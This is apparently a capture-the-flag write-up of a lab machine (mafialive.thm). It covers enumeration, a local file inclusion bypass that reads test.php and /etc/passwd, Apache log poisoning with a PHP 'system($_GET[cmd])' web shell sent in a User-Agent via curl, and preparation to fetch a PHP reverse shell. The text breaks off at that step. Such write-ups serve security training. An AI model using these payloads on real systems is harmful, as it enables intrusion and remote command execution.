### Emuneration
We can start by performing an nmap scan on the target to get open ports, running services and OS detection
`sudo nmap -A 10.10.151.132`
from this we get the following results
![[nmap_scan.png]]
We can see open ports include port 22 and 80 from the aggressive scan. We can visit the IP address on port 80 we get the following web page
![[web_page.png]]
Once we get the web page, we have our first answer in front of us.
When we try to visit this flag we get an error 404 which is a classic case of private hosting. We need to add that IP address to the `/etc/hosts` file. 

![[add_domain.png]]

When we visit the page using the domain name, we get a web page with the following content

![[flag_1.png]]
The first flag can be found in that page.

We can then enumerate the webpage further for directories in the webpage using dirb. To do this we run `dirb http://10.10.151.132` you can use whatever word list you please for me I choose the common word list. From this, we get the following results
```sh
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Oct 30 13:03:28 2022
URL_BASE: http://10.10.151.132/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.151.132/ ----
==> DIRECTORY: http://10.10.151.132/flags/                                         
==> DIRECTORY: http://10.10.151.132/images/                                        
+ http://10.10.151.132/index.html (CODE:200|SIZE:19188)                            
http://10.10.151.132/                                                               ==> DIRECTORY: http://10.10.151.132/layout/                                        
==> DIRECTORY: http://10.10.151.132/pages/                                         
+ http://10.10.151.132/server-status (CODE:403|SIZE:278)       
```
Hot tip: The flags/ directory has something special (wink emoji).
Following a further look at these directories we can see that most pages have the html and php extension. We can then fuzz the domain we found earlier by using dirb and adding the .php and .html extension.
`dirb http://mafialive.thm -X .php .html`
We get the following results
```sh
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Oct 30 13:49:57 2022
URL_BASE: http://mafialive.thm/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
EXTENSIONS_LIST: (.php,.html) | (.php)(.html) [NUM = 2]

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://mafialive.thm/ ----
+ http://mafialive.thm/index.html (CODE:200|SIZE:59)                               
+ http://mafialive.thm/test.php (CODE:200|SIZE:286)                                
                                                                                   
-----------------
END_TIME: Sun Oct 30 14:17:45 2022
DOWNLOADED: 9224 - FOUND: 2
```
When we look at test.php we get the following page
![[test_page.png]]
Looking at the link structure, we can try some directory traversal voodoo but upon trial we do not get any results worth writing about.
This is where new learnings come from, I decided to look at new ways on how to bypass LFI restrictions that have been put in place, I came across this article on [booktricks.hacktricks.xyz](https://book.hacktricks.xyz/pentesting-web/file-inclusion#basic-lfi-and-bypasses) on different ways to hack Local File Inclusion filters that have been put in place. (This was guesswork :) )
I also tried to use convert.base64-encoded filters to obtain a base-64 version of the file. I then get the following results.
![[bas_64_encoded_version.png]]
Upon decoding the above material, I get the following php file
```php
<!DOCTYPE HTML>

<html>

  

<head>

<title>INCLUDE</title>

<h1>Test Page. Not to be Deployed</h1>

</button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>

<?php

  

//FLAG: thm{explo1t1ng_lf1}

  

function containsStr($str, $substr) {

return strpos($str, $substr) !== false;

}

if(isset($_GET["view"])){

if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {

include $_GET['view'];

}else{

  

echo 'Sorry, Thats not allowed';

}

}

?>

</div>

</body>

  

</html>
```
We get our second flag in the PHP file and we continue to try and get a shell session. 
From the PHP excerpt above, we can see that the code filters `../..` type of queries. This is why we were not able to check navigate to other directories. With this knowledge, we can go back to our environment and try another LFI vector to access the `passwd` file. We can do that entering the following on our browser
![[path_traversal.png]]
This entry gives us the following
```sh
root:x:0:0:root:/root:/bin/bash

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

bin:x:2:2:bin:/bin:/usr/sbin/nologin

sys:x:3:3:sys:/dev:/usr/sbin/nologin

sync:x:4:65534:sync:/bin:/bin/sync

games:x:5:60:games:/usr/games:/usr/sbin/nologin

man:x:6:12:man:/var/cache/man:/usr/sbin/nologin

lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin

mail:x:8:8:mail:/var/mail:/usr/sbin/nologin

news:x:9:9:news:/var/spool/news:/usr/sbin/nologin

uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin

proxy:x:13:13:proxy:/bin:/usr/sbin/nologin

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

backup:x:34:34:backup:/var/backups:/usr/sbin/nologin

list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin

irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin

gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin

nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin

systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin

systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin

syslog:x:102:106::/home/syslog:/usr/sbin/nologin

messagebus:x:103:107::/nonexistent:/usr/sbin/nologin

_apt:x:104:65534::/nonexistent:/usr/sbin/nologin

uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin

sshd:x:106:65534::/run/sshd:/usr/sbin/nologin

archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
```

#### Short break
##### Log poisoning
Log poisoning is when you insert malicious code into an application’s log file in order to execute it. This application can be anything such as a web application, SSH or FTP. One way of triggering malicious code in a log file is Local File Inclusion. More information on how log poisoning is and how to execute it can be found [here](https://casimsec.com/2021/10/30/log-poisoning-and-lfi/)

#### Back to topic
We can now be able to perform path traversal to look at the Apache logs that are collected by using the following browser entry

![[apache_logs.png]]
Given this output, we can try to inject the logs with malicious PHP code using curl as shown below. 
`curl "http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././.././var/log/apache2/access.log" -H "User-Agent: <?php system($_GET["cmd"]; ?>"`
This gives us the output of the logs as shown below
```sh
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        
10.8.16.98 - - [30/Oct/2022:22:07:24 +0530] "GET / HTTP/1.1" 304 180 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
10.8.16.98 - - [30/Oct/2022:22:07:32 +0530] "GET /test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php HTTP/1.1" 200 1072 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
10.8.16.98 - - [30/Oct/2022:22:07:49 +0530] "GET /test.php HTTP/1.1" 200 473 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
10.8.16.98 - - [30/Oct/2022:22:07:50 +0530] "GET /test.php?view=/var/www/html/development_testing/mrrobot.php HTTP/1.1" 200 485 "http://mafialive.thm/test.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
10.8.16.98 - - [30/Oct/2022:22:08:43 +0530] "GET /test.php?view=/var/www/html/development_testing/./.././.././.././.././../etc/passwd HTTP/1.1" 200 949 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
10.8.16.98 - - [30/Oct/2022:22:09:35 +0530] "-" 408 0 "-" "-"
10.8.16.98 - - [30/Oct/2022:22:18:59 +0530] "GET /test.php?view=/var/www/html/development_testing/./.././.././.././.././../var/log/apache2/access.log HTTP/1.1" 200 762 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
10.8.16.98 - - [30/Oct/2022:22:19:51 +0530] "-" 408 0 "-" "-"
10.8.16.98 - - [30/Oct/2022:22:22:17 +0530] "GET /test.php?view=/var/www/html/development_testing/./../.././.././.././.././var/log/apache2/access.log HTTP/1.1" 200 482 "-" ""
    </div>
</body>

</html>
```

At this point, we are ready to exploit our PHP website by spawning a reverse shell, we can now start a python server on our machine to upload our PHP reverse shell that we got [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) 
`python -m http.server` 
We can now proceed to upload our file using the `wget` command. 
``